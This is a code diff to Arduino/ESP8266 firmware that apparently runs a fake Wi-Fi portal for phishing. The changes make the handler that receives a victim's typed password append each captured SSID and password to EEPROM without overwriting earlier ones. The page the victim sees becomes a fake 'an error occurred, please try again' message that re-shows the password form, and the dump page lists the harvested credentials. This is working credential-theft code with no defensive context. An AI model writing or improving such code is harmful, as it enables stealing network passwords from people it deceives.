@@ -71,8 +71,7 @@ void handleRoot()
   pagina += String(F("</h2>"));
   pagina += FPSTR(HTML_Formulario_Root);
   pagina += FPSTR(HTML_end);
-
-
+  
   server.send(200, "text/html", pagina); //Send web page
   Serial.println(F("root"));
 }
@@ -123,24 +122,35 @@ void handlePescando()
 // Pique - Dale cañazo
 void handlePique()
 {
+  int posicion = 0;
+  String dato;
+  // Busca la última ocurrencia de "}" y graba el valor de su posición
+  for(int i = 0; i < 1024; i++)
+  {
+    dato = char(EEPROM.read(i + 1024));
+    dato != "}" ? : posicion = i + 1;
+  }
 
   String pique = String(F("{SSID:"));
   pique += ssid_a_pescar;
   pique += String(F(";PASS:"));
   pique += server.arg("p");
   pique += String(F("}"));
+
   for (int i = 0; i < pique.length(); i++)
   {
-    EEPROM.write(i + 1024, pique[i]);
+    EEPROM.write(i + 1024 + posicion, pique[i]);
   }
   EEPROM.commit();
 
   String pagina = FPSTR(HTML_Head);
-  pagina += FPSTR(HTML_Style);
+  pagina += FPSTR(HTML_Style_Root);
   pagina += FPSTR(HTML_Head_end);
-  pagina += String(F("<h1>&#127907; "));
+  pagina += String(F("<h2>&#128246;  "));
   pagina += ssid_a_pescar;
-  pagina += String(F("</h1>"));
+  pagina += String(F("</h2>"));
+  pagina += String(F("<h3>Ha ocurrido un error por favor intente nuevamente.</h3>"));
+  pagina += FPSTR(HTML_Formulario_Root);
   pagina += FPSTR(HTML_end);
 
   server.send(200, "text/html", pagina); //Send web page
@@ -184,10 +194,24 @@ void handleInfo()
 void handleEeprom()
 {
   String ee;
+  String dato;
   for(int i = 0; i < 1024; i++)
   {
-    ee = ee + char(EEPROM.read(i + 1024)); //Read one by one with starting address of 0x0F
+    dato = char(EEPROM.read(i + 1024));
+    if(dato == "{")
+    {
+      ee += "<p>";
+    }
+    else if(dato == "}")
+    {
+      ee += "</p>";
+    }
+    else
+    {
+      ee = ee + dato; //Read one by one with starting address of 0x0F
+    }
   }
+
   server.send(200, "text/html", ee); //Send web page
   Serial.println(F("eeprom"));
 }
